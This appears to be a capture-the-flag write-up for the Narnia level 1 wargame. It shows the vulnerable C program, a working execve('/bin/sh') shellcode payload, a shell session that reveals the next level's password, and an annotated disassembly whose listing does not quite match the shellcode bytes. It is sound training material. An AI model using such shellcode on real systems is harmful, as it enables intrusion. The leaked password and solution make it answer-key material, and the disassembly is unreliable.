Level code
----------
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}

Solution code
-------------
#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  printf("%s",shellcode);
}
---
narnia1@melinda:/tmp/psu1$ export EGG=`./a.out`
narnia1@melinda:/tmp/psu1$ /narnia/narnia1          
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
nairiepecu
$ 

-------
Disassembled shell code
 31 c0                 xor    %eax,%eax     // Put /bin/sh string on stack
 50                    push   %eax
 68 2f 2f 73 68        push   $0x68732f2f
 68 2f 62 69 6e        push   $0x6e69622f
 89 e3                 mov    %esp,%ebx    // Pointer to /bin/sh in %ebx
 89 c1                 mov    %eax,%ecx    // Null bytes in other regs
 89 c2                 mov    %eax,%edx
 b0 0b                 mov    $0xb,%al     // execve == 11
 cd 80                 int    $0x80        // Call execve("/bin/sh",0,0)
 90                    nop                 // Pad to multiple of 4
